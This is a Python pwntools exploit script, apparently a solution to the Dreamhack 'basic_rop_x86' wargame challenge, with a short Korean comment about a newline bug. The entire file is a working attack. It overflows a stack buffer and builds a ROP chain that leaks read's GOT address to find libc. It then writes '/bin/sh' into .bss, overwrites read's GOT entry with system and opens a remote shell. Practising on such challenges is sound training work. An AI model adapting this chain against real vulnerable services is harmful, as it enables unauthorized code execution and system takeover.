#!/usr/bin/python3

import pwn

pwn.context.log_level = 'debug'

#p = pwn.process("/tmp/basic_rop_x86")
p = pwn.remote("host1.dreamhack.games", 8847)
elf = pwn.ELF("/tmp/basic_rop_x86")

writePlt = 0x8048450
readGot = 0x804a00c
readPlt = 0x80483f0
p3r = 0x8048689

buf = b"A"*0x40
padding = buf + b"A"*0x8

payload = padding
payload += pwn.p32(writePlt)
payload += pwn.p32(p3r)
payload += pwn.p32(0x1)
payload += pwn.p32(readGot)
payload += pwn.p32(0x4)
payload += pwn.p32(readPlt)
payload += pwn.p32(p3r)
payload += pwn.p32(0x0)
payload += pwn.p32(elf.bss())
payload += pwn.p32(0x8)
payload += pwn.p32(readPlt)
payload += pwn.p32(p3r)
payload += pwn.p32(0x0)
payload += pwn.p32(readGot)
payload += pwn.p32(0x4)
payload += pwn.p32(writePlt)
payload += pwn.p32(p3r)
payload += pwn.p32(0x1)
payload += pwn.p32(readGot)
payload += pwn.p32(0x4)
payload += pwn.p32(readPlt)
payload += pwn.p32(0xdeadbeef)
payload += pwn.p32(elf.bss())


pwn.log.info("Send payload")
p.sendline(payload)

p.recv(64)
readFunc = pwn.u32(p.recv(4))
pwn.log.info("Read Function Address: " + hex(readFunc))

readOffset = 0xd4350
libcBase = readFunc - readOffset
pwn.log.info("LIBC Base Address: " + hex(libcBase))

pwn.log.info("Send /bin/sh At " + hex(elf.bss()))
p.send("/bin/sh\x00")

systemOffset = 0x3a940
systemAddr = libcBase + systemOffset
pwn.log.info("System Address: " + hex(systemAddr))

pwn.log.info("Spoof read GOT...")
p.send(pwn.p32(systemAddr))

pwn.log.info("Spoofed read function GOT: " + hex(pwn.u32(p.recv(4))))

pwn.log.info("Call spoofed read function...")
p.interactive()

"""
\x0a와 관련하여 무언가 에러가 있는 것 같다. bss 영역에 값을 저장할 때와 system 함수를 호출할 때 sendline을 사용하면 제대로 동작하지 않는다.
"""
